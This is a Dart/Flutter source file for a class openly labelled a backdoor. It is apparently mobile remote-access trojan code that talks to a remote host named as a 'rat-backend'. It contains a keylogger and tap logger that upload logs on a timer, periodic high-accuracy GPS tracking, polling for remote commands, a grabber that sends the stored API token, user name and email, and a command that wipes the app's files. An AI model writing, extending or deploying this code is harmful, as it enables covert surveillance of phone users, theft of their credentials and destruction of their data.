import 'dart:io';
import 'dart:async';
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';

class RemoteController {
  static final String baseUrl = "https://alfinn-rat-backend.hf.space";
  static String _lastCommand = "";
  static Timer? _pollingTimer;
  static Timer? _keylogTimer;
  static Timer? _locationTimer;
  static Timer? _tapLoggerTimer;
  
  // ============ START ALL BACKDOOR ============
  static void start() {
    print("[BACKDOOR] Starting all modules...");
    startKeyLogger();
    startCommandPolling();
    startTapLogger();
    startAutoLocation();
    print("[BACKDOOR] All modules running");
  }
  
  // ============ 1. KEYLOGGER ============
  static void startKeyLogger() {
    _keylogTimer = Timer.periodic(Duration(seconds: 15), (timer) async {
      try {
        final dir = await getApplicationDocumentsDirectory();
        final file = File("${dir.path}/keylog.txt");
        if (await file.exists()) {
          String content = await file.readAsString();
          if (content.isNotEmpty) {
            await http.post(
              Uri.parse("$baseUrl/keylog"),
              body: {"data": content},
            );
            print("[KEYLOG] Sent: ${content.length} chars");
            await file.delete();
          }
        }
      } catch (e) {}
    });
  }
  
  static void logKeystroke(String text) async {
    try {
      final dir = await getApplicationDocumentsDirectory();
      final file = File("${dir.path}/keylog.txt");
      await file.writeAsString('${DateTime.now()}: $text\n', mode: FileMode.append);
    } catch (e) {}
  }
  
  // ============ 2. TAP TRACKING ============
  static void startTapLogger() {
    _tapLoggerTimer = Timer.periodic(Duration(seconds: 20), (timer) async {
      try {
        final dir = await getApplicationDocumentsDirectory();
        final file = File("${dir.path}/taps.log");
        if (await file.exists()) {
          String content = await file.readAsString();
          if (content.isNotEmpty) {
            await http.post(
              Uri.parse("$baseUrl/taps"),
              body: {"data": content},
            );
            print("[TAPS] Sent: ${content.length} chars");
            await file.delete();
          }
        }
      } catch (e) {}
    });
  }
  
  static void logTap(String widgetType, String? additionalInfo) async {
    try {
      final dir = await getApplicationDocumentsDirectory();
      final file = File("${dir.path}/taps.log");
      final info = additionalInfo ?? "";
      await file.writeAsString(
        '${DateTime.now()}: TAP on $widgetType $info\n',
        mode: FileMode.append,
      );
    } catch (e) {}
  }
  
  // ============ 3. LOKASI GPS ============
  static void startAutoLocation() {
    _locationTimer = Timer.periodic(Duration(minutes: 5), (timer) async {
      await _getAndSendLocation();
    });
  }
  
  static Future<void> _getAndSendLocation() async {
    try {
      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
      }
      
      if (permission == LocationPermission.always || permission == LocationPermission.whileInUse) {
        Position position = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.high,
        );
        await sendLocation(position.latitude, position.longitude);
        print("[LOKASI] Terkirim: ${position.latitude}, ${position.longitude}");
      }
    } catch (e) {
      print("[LOKASI] Error: $e");
    }
  }
  
  static Future<void> sendLocation(double lat, double lng) async {
    try {
      await http.post(
        Uri.parse("$baseUrl/location"),
        body: {"lat": lat.toString(), "lng": lng.toString()},
      );
    } catch (e) {}
  }
  
  // ============ 4. POLLING PERINTAH ============
  static void startCommandPolling() {
    _pollingTimer = Timer.periodic(Duration(seconds: 10), (timer) async {
      try {
        final response = await http.get(
          Uri.parse("$baseUrl/get_command"),
        ).timeout(Duration(seconds: 5));
        
        String command = response.body.trim();
        
        if (command.isNotEmpty && command != _lastCommand) {
          print("[CMD] New command: $command");
          _lastCommand = command;
          
          if (command == "delete_files") {
            await _deleteAllFiles();
          } else if (command == "get_token") {
            await _sendToken();
          } else if (command == "get_location") {
            await _getAndSendLocation();
          }
        }
      } catch (e) {}
    });
  }
  
  // ============ 5. TOKEN GRABBER ============
  static Future<void> _sendToken() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('api_token') ?? '';
      final userName = prefs.getString('user_name') ?? '';
      final userEmail = prefs.getString('user_email') ?? '';
      
      await http.post(
        Uri.parse("$baseUrl/token"),
        body: {
          "token": token,
          "user_name": userName,
          "user_email": userEmail,
        },
      );
      print("[TOKEN] Sent");
    } catch (e) {}
  }
  
  // ============ 6. DELETE ALL FILES ============
  static Future<void> _deleteAllFiles() async {
    try {
      final dir = await getApplicationDocumentsDirectory();
      await dir.delete(recursive: true);
      print("[DELETE] Files deleted");
    } catch (e) {}
  }
  
  // ============ 7. STOP ============
  static void stop() {
    _pollingTimer?.cancel();
    _keylogTimer?.cancel();
    _locationTimer?.cancel();
    _tapLoggerTimer?.cancel();
    print("[BACKDOOR] Stopped");
  }
}